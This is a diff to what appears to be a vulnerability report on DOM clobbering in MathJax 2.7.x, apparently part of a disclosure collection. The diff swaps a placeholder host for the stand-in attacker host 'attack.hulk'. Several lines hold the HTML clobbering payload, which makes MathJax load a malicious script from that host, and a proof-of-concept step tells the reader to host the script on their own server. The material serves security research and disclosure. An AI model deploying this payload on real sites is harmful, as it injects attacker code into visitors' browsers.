@@ -6,7 +6,7 @@
 + Stars: 10.1K
 + Version: v2.7.x
 + Fingerprint: `MathJax.version == "2.7.2"`
-+ Payload: ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://xxx.xxx.xxx"></a>```
++ Payload: ```<a id="MathJax"></a> <a id="MathJax" name="root" href="https://attack.hulk"></a>```
 + Impact: XSS
 + CVE: N/A
 + Status: Accepted
@@ -98,7 +98,7 @@ loader: {
 
 ## PoC
 
-Please note that for the following proof of concept, you will need to replace `xxx.xxx.xxx` with your own server address to host the malicious script and configure the URL to route `//config/TeX-AMS-MML_HTMLorMML.js`.
+Please note that for the following proof of concept, you will need to replace `attack.hulk` with your own server address to host the malicious script and configure the URL to route `//config/TeX-AMS-MML_HTMLorMML.js`.
 ```
 const express = require('express');
 const path = require('path');
@@ -148,7 +148,7 @@ app.listen(port, () => {
 ### PoC #2
 ```html
 <a id="MathJax"></a>
-<a id="MathJax" name="root" href="http://xxx.xxx.xxx"></a>
+<a id="MathJax" name="root" href="http://attack.hulk"></a>
 
 <script id="MathJax-script" async src="https://mathjax.rstudio.com/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 ```
